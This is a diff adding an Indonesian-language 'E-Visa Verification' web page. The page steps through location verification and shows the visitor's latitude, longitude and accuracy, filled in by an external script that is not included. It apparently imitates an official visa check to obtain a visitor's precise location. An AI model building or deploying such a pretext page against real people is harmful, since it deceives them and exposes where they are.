@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>E-Visa Verification</title>
+
+<style>
+body { margin:0; font-family:sans-serif; background:#f4f6f9; }
+
+.header {
+  background: linear-gradient(to right,#0d47a1,#1976d2);
+  color:white;
+  padding:20px;
+  border-bottom-left-radius:20px;
+  border-bottom-right-radius:20px;
+}
+
+.step {
+  display:flex;
+  justify-content:space-between;
+  padding:15px;
+  font-size:12px;
+}
+.step div { flex:1; text-align:center; color:#999; }
+.step .active { color:#0d47a1; font-weight:bold; }
+.step .done { color:green; }
+
+.container { padding:20px; }
+
+.card {
+  background:white;
+  padding:20px;
+  border-radius:15px;
+  box-shadow:0 5px 15px rgba(0,0,0,0.1);
+}
+
+.status { margin-top:10px; font-size:13px; }
+</style>
+</head>
+
+<body>
+
+<div class="header">
+  <h3>E-Visa Verification</h3>
+</div>
+
+<div class="step">
+  <div id="step1" class="active">Verifikasi</div>
+  <div id="step2">Lokasi</div>
+  <div id="step3">Selesai</div>
+</div>
+
+<div class="container">
+  <div class="card">
+    <h3>Verifikasi Lokasi</h3>
+
+    <div class="status" id="status">Menginisialisasi sistem...</div>
+
+    <div style="font-size:12px;">
+      System: <span id="sysStatus">Idle</span><br>
+      Lat: <span id="lat">-</span><br>
+      Lon: <span id="lon">-</span><br>
+      Acc: <span id="acc">-</span>
+    </div>
+  </div>
+</div>
+
+<script type="module" src="js/app.js"></script>
+</body>
+</html>
